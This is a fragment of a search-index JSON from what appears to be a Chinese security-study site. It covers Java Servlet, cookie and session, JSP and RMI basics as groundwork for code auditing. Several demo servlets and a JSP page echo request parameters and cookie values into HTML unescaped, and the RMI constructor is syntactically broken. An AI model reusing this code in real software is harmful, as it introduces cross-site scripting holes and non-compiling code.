}","title":"Servlet\u751f\u547d\u5468\u671f"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#servlet_2","text":"\u6211\u4eec\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u7528\u6765\u63a7\u5236Get\u8bf7\u6c42\u7684\u54cd\u5e94 import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; @WebServlet(\"/a\") //\u7528\u4e8e\u8bbe\u5b9a\u8def\u7531 public class test extends HttpServlet { @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(\"text/html\"); PrintWriter out = response.getWriter(); out.println(\"<h1>\" + \"a\" + \"</h1>\"); } } \u81f3\u4e8e\u90e8\u7f72\u6211\u662f\u53c2\u8003\u7684\u8fd9\u4e2a\u6587\u7ae0 https://blog.csdn.net/gaoqingliang521/article/details/108677301 \u6211\u7684\u7248\u672c\u65f6idea 2020.2\uff0c\u53ef\u80fd\u4f1a\u6709\u51fa\u5165\u3002","title":"\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684Servlet"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_10","text":"servlet\u5904\u7406\u4f20\u53c2\u4e3b\u8981\u662f\u901a\u8fc7doGet\u548cdoPost\u65b9\u6cd5\u8fdb\u884c\u7684\u3002 \u63a5\u6536\u53c2\u6570\u503c\u4e3b\u8981\u662f\u9760\u4e0b\u9762\u7684\u65b9\u6cd5 getParameter()\uff1a \u60a8\u53ef\u4ee5\u8c03\u7528 request.getParameter() \u65b9\u6cd5\u6765\u83b7\u53d6\u8868\u5355\u53c2\u6570\u7684\u503c\u3002 getParameterValues()\uff1a \u5982\u679c\u53c2\u6570\u51fa\u73b0\u4e00\u6b21\u4ee5\u4e0a\uff0c\u5219\u8c03\u7528\u8be5\u65b9\u6cd5\uff0c\u5e76\u8fd4\u56de\u591a\u4e2a\u503c\uff0c\u4f8b\u5982\u590d\u9009\u6846\u3002 getParameterNames()\uff1a \u5982\u679c\u60a8\u60f3\u8981\u5f97\u5230\u5f53\u524d\u8bf7\u6c42\u4e2d\u7684\u6240\u6709\u53c2\u6570\u7684\u5b8c\u6574\u5217\u8868\uff0c\u5219\u8c03\u7528\u8be5\u65b9\u6cd5\u3002 \u6211\u4eec\u5199\u4e2ademo\u8bd5\u8bd5 import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; @WebServlet(\"/a\") public class test extends HttpServlet { @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(\"text/html\"); PrintWriter out = response.getWriter(); String name = new String(request.getParameter(\"name\")); out.println(\"your name is \"+name); } } \u8fd9\u4e2ademo\u4e3b\u8981\u7528\u4e8e\u63a5\u6536get\u6570\u636e\uff0c\u5e76\u505a\u51fa\u4e00\u4e9b\u5904\u7406\u8fd4\u56de. \u90a3\u4e48\u5982\u4f55\u63a5\u6536POST\u6570\u636e\u5462\uff1f\u548cdoGet\u5dee\u4e0d\u591a import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; @WebServlet(\"/a\") public class test extends HttpServlet { public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(\"text/html\"); PrintWriter out = response.getWriter(); String name = new String(request.getParameter(\"name\")); out.println(\"[Post]your name is \"+name); } } \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7684request.getParameter(\"name\")\u4f1a\u4f18\u5148\u9009\u62e9\u5728url\u91cc\u7684\u53c2\u6570\uff0c\u800c\u4e0d\u662fhttp\u5305\u4f53\u7684\u53c2\u6570","title":"\u5904\u7406\u4f20\u53c2"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#cookiesession","text":"** cookie ** cookie\u7684\u4e3b\u8981\u65b9\u6cd5\u5982\u4e0b \u5e8f\u53f7 \u65b9\u6cd5 & \u63cf\u8ff0 1 public void setDomain(String pattern) \u8be5\u65b9\u6cd5\u8bbe\u7f6e cookie \u9002\u7528\u7684\u57df\uff0c\u4f8b\u5982 runoob.com\u3002 2 public String getDomain() \u8be5\u65b9\u6cd5\u83b7\u53d6 cookie \u9002\u7528\u7684\u57df\uff0c\u4f8b\u5982 runoob.com\u3002 3 public void setMaxAge(int expiry) \u8be5\u65b9\u6cd5\u8bbe\u7f6e cookie \u8fc7\u671f\u7684\u65f6\u95f4\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002\u5982\u679c\u4e0d\u8fd9\u6837\u8bbe\u7f6e\uff0ccookie \u53ea\u4f1a\u5728\u5f53\u524d session \u4f1a\u8bdd\u4e2d\u6301\u7eed\u6709\u6548\u3002 4 public int getMaxAge()\u8be5\u65b9\u6cd5\u8fd4\u56de cookie \u7684\u6700\u5927\u751f\u5b58\u5468\u671f\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c-1 \u8868\u793a cookie \u5c06\u6301\u7eed\u4e0b\u53bb\uff0c\u76f4\u5230\u6d4f\u89c8\u5668\u5173\u95ed 5 public String getName()*\u8be5\u65b9\u6cd5\u8fd4\u56de cookie \u7684\u540d\u79f0\u3002\u540d\u79f0\u5728\u521b\u5efa\u540e\u4e0d\u80fd\u6539\u53d8 6 public void setValue(String newValue) \u8be5\u65b9\u6cd5\u8bbe\u7f6e\u4e0e cookie \u5173\u8054\u7684\u503c\u3002 7 public String getValue() \u8be5\u65b9\u6cd5\u83b7\u53d6\u4e0e cookie \u5173\u8054\u7684\u503c\u3002 8 public void setPath(String uri) \u8be5\u65b9\u6cd5\u8bbe\u7f6e cookie \u9002\u7528\u7684\u8def\u5f84\u3002\u5982\u679c\u60a8\u4e0d\u6307\u5b9a\u8def\u5f84\uff0c\u4e0e\u5f53\u524d\u9875\u9762\u76f8\u540c\u76ee\u5f55\u4e0b\u7684\uff08\u5305\u62ec\u5b50\u76ee\u5f55\u4e0b\u7684\uff09\u6240\u6709 URL \u90fd\u4f1a\u8fd4\u56de cookie\u3002 9 public String getPath() \u8be5\u65b9\u6cd5\u83b7\u53d6 cookie \u9002\u7528\u7684\u8def\u5f84\u3002 10 public void setSecure(boolean flag)\u8be5\u65b9\u6cd5\u8bbe\u7f6e\u5e03\u5c14\u503c\uff0c\u8868\u793a cookie \u662f\u5426\u5e94\u8be5\u53ea\u5728\u52a0\u5bc6\u7684\uff08\u5373 SSL\uff09\u8fde\u63a5\u4e0a\u53d1\u9001\u3002 11 public void setComment(String purpose) \u8bbe\u7f6ecookie\u7684\u6ce8\u91ca\u3002\u8be5\u6ce8\u91ca\u5728\u6d4f\u89c8\u5668\u5411\u7528\u6237\u5448\u73b0 cookie \u65f6\u975e\u5e38\u6709\u7528\u3002 12 public String getComment() \u83b7\u53d6 cookie \u7684\u6ce8\u91ca\uff0c\u5982\u679c cookie \u6ca1\u6709\u6ce8\u91ca\u5219\u8fd4\u56de null\u3002 \u6211\u4eec\u9a6c\u4e0a\u5199\u4e00\u4e2ademo\uff0c\u8fd9\u4e2ademo\u4f1a\u7528\u5230 response.addCookie\u7528\u4e8e\u5728\u54cd\u5e94\u5934\u91cc\u6dfb\u52a0cookie\uff0ccookie.setMaxAge \u7528\u4e8e\u8bbe\u7f6ecookie\u7684\u6709\u6548\u671f\uff0crequest.getCookies \u7528\u4e8e\u83b7\u53d6\u8bf7\u6c42\u91cc\u7684cookie\u6570\u7ec4 \u8fd9\u91cc\u7684demo\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u7528\u4e8e\u6dfb\u52a0cookie\uff0c\u4e00\u4e2a\u7528\u4e8e\u8f93\u51facookie \u7528\u4e8e\u6dfb\u52a0cookie import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; @WebServlet(\"/a\") public class test extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { Cookie name = new Cookie(\"name\", request.getParameter(\"name\")); // \u4e2d\u6587\u8f6c\u7801 name.setMaxAge(60*60*24); response.addCookie( name ); } } \u8f93\u51facookie\u503c import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; @WebServlet(\"/b\") public class test2 extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { Cookie cookie = null; Cookie[] cookies = null; // \u83b7\u53d6\u4e0e\u8be5\u57df\u76f8\u5173\u7684 Cookie \u7684\u6570\u7ec4 cookies = request.getCookies(); // \u8bbe\u7f6e\u54cd\u5e94\u5185\u5bb9\u7c7b\u578b response.setContentType(\"text/html;charset=UTF-8\"); PrintWriter out = response.getWriter(); for (int i = 0; i < cookies.length; i++){ if((cookies[i].getName()).compareTo(\"name\")==0){ out.println(\"your name is \"+cookies[i].getValue()); } } } } ** session ** servle\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217session\u63a5\u53e3\u8f85\u52a9\u8fd9\u4e2a\u6d41\u7a0b 1 public Object getAttribute(String name) \u8be5\u65b9\u6cd5\u8fd4\u56de\u5728\u8be5 session \u4f1a\u8bdd\u4e2d\u5177\u6709\u6307\u5b9a\u540d\u79f0\u7684\u5bf9\u8c61\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u540d\u79f0\u7684\u5bf9\u8c61\uff0c\u5219\u8fd4\u56de null\u3002 2 public Enumeration getAttributeNames() \u8be5\u65b9\u6cd5\u8fd4\u56de String \u5bf9\u8c61\u7684\u679a\u4e3e\uff0cString \u5bf9\u8c61\u5305\u542b\u6240\u6709\u7ed1\u5b9a\u5230\u8be5 session \u4f1a\u8bdd\u7684\u5bf9\u8c61\u7684\u540d\u79f0\u3002 3 public long getCreationTime() \u8be5\u65b9\u6cd5\u8fd4\u56de\u8be5 session \u4f1a\u8bdd\u88ab\u521b\u5efa\u7684\u65f6\u95f4\uff0c\u81ea\u683c\u6797\u5c3c\u6cbb\u6807\u51c6\u65f6\u95f4 1970 \u5e74 1 \u6708 1 \u65e5\u5348\u591c\u7b97\u8d77\uff0c\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\u3002 4 public String getId() \u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u5206\u914d\u7ed9\u8be5 session \u4f1a\u8bdd\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u7684\u5b57\u7b26\u4e32\u3002 5 public long getLastAccessedTime() \u8be5\u65b9\u6cd5\u8fd4\u56de\u5ba2\u6237\u7aef\u6700\u540e\u4e00\u6b21\u53d1\u9001\u4e0e\u8be5 session \u4f1a\u8bdd\u76f8\u5173\u7684\u8bf7\u6c42\u7684\u65f6\u95f4\u81ea\u683c\u6797\u5c3c\u6cbb\u6807\u51c6\u65f6\u95f4 1970 \u5e74 1 \u6708 1 \u65e5\u5348\u591c\u7b97\u8d77\uff0c\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\u3002 6 public int getMaxInactiveInterval() \u8be5\u65b9\u6cd5\u8fd4\u56de Servlet \u5bb9\u5668\u5728\u5ba2\u6237\u7aef\u8bbf\u95ee\u65f6\u4fdd\u6301 session \u4f1a\u8bdd\u6253\u5f00\u7684\u6700\u5927\u65f6\u95f4\u95f4\u9694\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d\u3002 7 public void invalidate() \u8be5\u65b9\u6cd5\u6307\u793a\u8be5 session \u4f1a\u8bdd\u65e0\u6548\uff0c\u5e76\u89e3\u9664\u7ed1\u5b9a\u5230\u5b83\u4e0a\u9762\u7684\u4efb\u4f55\u5bf9\u8c61\u3002 8 public boolean isNew() \u5982\u679c\u5ba2\u6237\u7aef\u8fd8\u4e0d\u77e5\u9053\u8be5 session \u4f1a\u8bdd\uff0c\u6216\u8005\u5982\u679c\u5ba2\u6237\u9009\u62e9\u4e0d\u53c2\u5165\u8be5 session \u4f1a\u8bdd\uff0c\u5219\u8be5\u65b9\u6cd5\u8fd4\u56de true\u3002 9 public void removeAttribute(String name) \u8be5\u65b9\u6cd5\u5c06\u4ece\u8be5 session \u4f1a\u8bdd\u79fb\u9664\u6307\u5b9a\u540d\u79f0\u7684\u5bf9\u8c61\u3002 10 public void setAttribute(String name, Object value) \u8be5\u65b9\u6cd5\u4f7f\u7528\u6307\u5b9a\u7684\u540d\u79f0\u7ed1\u5b9a\u4e00\u4e2a\u5bf9\u8c61\u5230\u8be5 session \u4f1a\u8bdd\u3002 \u5199\u4e2ademo\u5427\uff0c\u8fc7\u4e00\u8fc7\u5c31\u884c\u4e86 import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; import java.text.*; import java.util.*; @WebServlet(\"/a\") public class test extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { HttpSession session = request.getSession(); //\u521b\u5efa\u4e00\u4e2asession\u5bf9\u8c61 Date createtime = new Date(session.getCreationTime()); Date lastAccessTime = new Date(session.getLastAccessedTime()); PrintWriter out = response.getWriter(); SimpleDateFormat df = new SimpleDateFormat(\"yyyy-MM-dd:mm:ss\"); String countkey = new String(\"key\"); //\u8bbf\u95ee\u6b21\u6570\u7684\u952e Integer count = Integer.valueOf(0); //\u8bbf\u95ee\u6b21\u6570\u7684\u503c String userID = new String(\"Tom\"); //\u7528\u6237ID\u7684\u503c String userIDKey = new String(\"userIDKey\"); //\u7528\u6237ID\u7684\u952e if(session.getAttribute(countkey)==null){ //\u5982\u679c\u83b7\u5f97\u8be5session\u7684countkey\u8fd9\u4e2a\u952e\u7684\u503c\u4e0d\u5b58\u5728\u65f6\uff0c\u4e3a\u5f53\u524dsession\u521d\u59cb\u5316\u8fd9\u4e2a\u952e session.setAttribute(countkey,Integer.valueOf(0)); } if(session.isNew()){ //\u5982\u679csession\u662f\u7b2c\u4e00\u6b21\u521b\u5efa\uff0c\u5219\u4e3a\u5176\u521d\u59cb\u5316userID\u952e session.setAttribute(userIDKey,userID); } else{ count = (Integer) session.getAttribute(countkey); count = count+1; userID = (String)session.getAttribute(userIDKey); } session.setAttribute(countkey,count); out.println(\"hello\"+userID+\"\\nthis is the \"+count+\" to visit this website\\n\"); out.println(\"first time:\"+createtime+\"\\n this time:\"+lastAccessTime); } }","title":"cookie\\&amp;session"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#jsp","text":"","title":"JSP"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_11","text":"JSP\u662f\u811a\u672c\u8bed\u8a00\uff0c\u4e0ePHP\u7b49\u8bed\u8a00\u7c7b\u4f3c\u3002JSP\u672c\u8d28\u5c31\u662fservlet\uff0c\u5b83\u5b58\u5728\u7684\u610f\u4e49\u5c31\u662f\u7b80\u5316servlet\u590d\u6742\u7684\u7a0b\u5e8f\u8fc7\u7a0b","title":"\u6982\u89c8"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#jsp_1","text":"** \u4ee3\u7801\u6bb5 ** JSP\u548cPHP\u7b49\u53ef\u4ee5\u5d4c\u5165\u5230HTML\u7684\u811a\u672c\u8bed\u8a00\u7c7b\u4f3c\uff0c\u9700\u8981\u7528\u4e00\u4e2a\u4ee3\u7801\u6bb5\u5305\u88f9\u4ee3\u7801\u3002 \u5176\u683c\u5f0f\u5982\u4e0b <% code %> \u540c\u65f6\u5728\u4ee3\u7801\u6bb5\u4e2d\u8fd8\u5b58\u5728\u7740\u6307\u4ee4\u6807\u7b7e:Page,include,taglib \u4ed6\u4eec\u7684\u5b9a\u4e49\u548c\u4f5c\u7528\u5982\u4e0b <%@ page ...... %> page\u6307\u4ee4\u7528\u4e8e\u5b9a\u4e49\u7f51\u9875\u7684\u5404\u5c5e\u6027\uff0c\u5982<%@ page import=\"...\" %> \u8868\u793a\u8981\u5bfc\u5165\u54ea\u4e9bjava\u6a21\u5757,<%@ page language=\"...\" %>\u8868\u793aJSP\u9875\u9762\u6240\u7528\u7684\u8bed\u8a00\uff0c\u9ed8\u8ba4\u662fjava <%@ include file=\"\u6587\u4ef6\u76f8\u5bf9url\u5730\u5740\" %> \u8868\u793a\u8981\u5305\u542b\u54ea\u4e9b\u5176\u4ed6\u6587\u4ef6\uff0c\u53ef\u4ee5\u5305\u542bJSP,HTML\u6216txt\u7b49\u6587\u4ef6 <%@ taglib ......%> \u4e3b\u8981\u7528\u4e8e\u7528\u6237\u81ea\u5b9a\u4e49\u6807\u7b7e ** \u52a8\u4f5c\u5143\u7d20 ** \u4e0e\u6307\u4ee4\u5143\u7d20\u6bd4\u8f83\u76f8\u4f3c\uff0c\u4f46\u4e0d\u540c\u7684\u662f\u52a8\u4f5c\u5143\u7d20\u53ef\u4ee5\u52a8\u6001\u7684\u63d2\u5165\uff0c\u4e0d\u50cf\u6307\u4ee4\u5143\u7d20\u4e00\u6837\u4e00\u5f00\u5934\u5c31\u4f1a\u88ab\u6267\u884c\u3002 ** \u4e5d\u5927\u5bf9\u8c61 ** JSP\u4e2d\u6709\u4e5d\u5927\u5bf9\u8c61\u7528\u4e8e\u5b9e\u73b0\u5404\u79cd\u64cd\u4f5c\u3002 \u81f3\u4e8erequest\u548cresponse\uff0c\u8fd9\u4fe9\u7528\u7684\u662f\u6700\u591a\u7684\u662f\u4ed6\u4eec\uff0c out\u5bf9\u8c61\u4e3b\u8981\u7528\u4e8e\u5728response\u4e2d\u5199\u5165\u8f93\u51fa\u5185\u5bb9\uff0c out.println\u6216\u8005out.print\u7528\u4e8e\u8f93\u51fa\u5185\u5bb9\uff0cout.flush\u7528\u4e8e\u5237\u65b0\u8f93\u51fa\u6d41,\u5176\u4f59\u5728\u65b0\u624b\u9636\u6bb5\u90fd\u4e0d\u548b\u7528\u3002 ** \u4f20\u53c2\u5904\u7406 ** getParameter(): \u4f7f\u7528 request.getParameter() \u65b9\u6cd5\u6765\u83b7\u53d6\u8868\u5355\u53c2\u6570\u7684\u503c\u3002 getParameterValues(): \u83b7\u5f97\u5982checkbox\u7c7b\uff08\u540d\u5b57\u76f8\u540c\uff0c\u4f46\u503c\u6709\u591a\u4e2a\uff09\u7684\u6570\u636e\u3002 \u63a5\u6536\u6570\u7ec4\u53d8\u91cf \uff0c\u5982checkbox\u7c7b\u578b getParameterNames(): \u8be5\u65b9\u6cd5\u53ef\u4ee5\u53d6\u5f97\u6240\u6709\u53d8\u91cf\u7684\u540d\u79f0\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a Enumeration\u3002 getInputStream(): \u8c03\u7528\u6b64\u65b9\u6cd5\u6765\u8bfb\u53d6\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u6d41\u3002 <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <html> <head> <title>test jsp</title> </head> <body> your name is <%=request.getParameter(\"name\")%> </body> </html>","title":"JSP\u57fa\u7840\u8bed\u6cd5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#cookiesession_1","text":"** cookie\uff0csession\u5728JSP\u91cc\u7684\u8bbe\u7f6e\u4e0eservlet\u5982\u51fa\u4e00\u8f99 ** cookie\u548csession\u5728jsp\u7684<%%>\u4ee3\u7801\u533a\u91cc\u8bbe\u7f6e\uff0c\u8bbe\u7f6e\u65b9\u6cd5\u4e0eservlet\u5982\u51fa\u4e00\u8f99\uff0c\u56e0\u4e3a<%%>\u4ee3\u7801\u533a\u91cc\u672c\u8eab\u5c31\u662f\u8c03\u7528\u7684java\u4ee3\u7801\uff0c\u6240\u4ee5\u4e0d\u518d\u8d58\u8ff0","title":"cookie\\&amp;session"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#rmi","text":"","title":"RMI"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#rmi_1","text":"RMI\uff0c\u5373\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff0c\u5141\u8bb8\u8fd0\u884c\u5728\u4e00\u4e2aJAVA\u865a\u62df\u673a\u8c03\u7528\u53e6\u4e00\u4e2aJAVA\u865a\u62df\u673a\u4e0a\u7684\u5bf9\u8c61\u7684\u65b9\u6cd5.","title":"\u4f55\u4e3aRMI"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#rmi_2","text":"RMI\u7684\u8fdc\u7a0b\u63a5\u53e3\u7528\u4e8e\u5176\u4ed6java\u865a\u62df\u673a\u8fdc\u7a0b\u8c03\u7528\u8be5\u63a5\u53e3\u4e0b\u7684\u5bf9\u8c61\u7684\u65b9\u6cd5.","title":"RMI:\u5b9e\u73b0\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_12","text":"import java.rmi.Remote; //\u5f15\u5165Remote\u63a5\u53e3 public interface IHello extends Remote{ //\u5b9e\u73b0\u4e00\u4e2aRemote\u63a5\u53e3 public String sayHello(String name) throws java.rmi.RemoteException; //\u82e5\u662fRemote\u63a5\u53e3\u91cc\u67d0\u4e2a\u65b9\u6cd5\u629b\u51faRemoteException\u5f02\u5e38,\u5c31\u610f\u5473\u7740\u8fd9\u662f\u4e00\u4e2a\u53ef\u4ee5\u88ab\u8fdc\u7a0b\u8c03\u7528\u7684\u65b9\u6cd5,\u4f46\u76ee\u524d\u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u672a\u88ab\u5177\u4f53\u5b9e\u73b0. }","title":"\u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_13","text":"\u521a\u521a\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2aRemote\u63a5\u53e3,\u4f46\u662f\u4ed6\u7684\u65b9\u6cd5\u8fd8\u672a\u5177\u4f53\u5b9e\u73b0.\u6211\u4eec\u5c31\u6765\u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b\u5427 import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class HelloImpl extends UnicastRemoteObject implements IHello{ //\u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3\u5b9e\u73b0\u7c7b,\u6ce8\u610f\u8fd9\u4e2a\u8fdc\u7a0b\u5b9e\u73b0\u7c7b\u5fc5\u987b\u7ee7\u627f\u81eaUnicastRemoteObject,\u4e0d\u7136\u670d\u52a1\u7aef\u4e0d\u4f1a\u53d1\u9001\u8be5\u7c7b\u7684\u5bf9\u8c61\u7684\u5b58\u6839(stub(\u4e0b\u6587\u8bb2)) protected HelloImpl throws RemoteException{//\u5fc5\u987b\u8981\u6709\u4e00\u4e2a\u629b\u51faRemoteException\u5f02\u5e38\u7684\u663e\u793a\u6784\u9020\u51fd\u6570 super(); } public String sayHello(String name) throws RemoteException{ return \"Hello\"+name; //\u5b9a\u4e49\u5b9e\u73b0\u7c7b\u65b9\u6cd5\u7684\u5177\u4f53\u4ee3\u7801 } }","title":"\u8fdc\u7a0b\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#jvmrmi-registry","text":"\u4f55\u4e3aRMI Registry \u53ef\u4ee5\u7406\u89e3\u4e3a\u90e8\u7f72\u5728\u88ab\u8fdc\u7a0b\u8c03\u7528\u7684JAVA\u865a\u62df\u673a\u4e0a\u7684\u4e00\u4e2a\u5e94\u7528,\u7528\u4e8e\u5c06stub\u7ed1\u5b9a\u5230Registry\u670d\u52a1\u7684URL\u4e0a\u3002 \u670d\u52a1\u7aef\u7ed1\u5b9astub\u5230\u6307\u5b9aurl java.rmi.Naming.rebind(\"rmi://localhost:1099/hello\", hello); //\u5982\u6b64\u5904\u5c31\u662f\u628ahello\u8fd9\u4e2a\u5bf9\u8c61\u7ed1\u5b9a\u5728\u4e86rmi://localhost:1099/hello\u8fd9\u4e2aURL 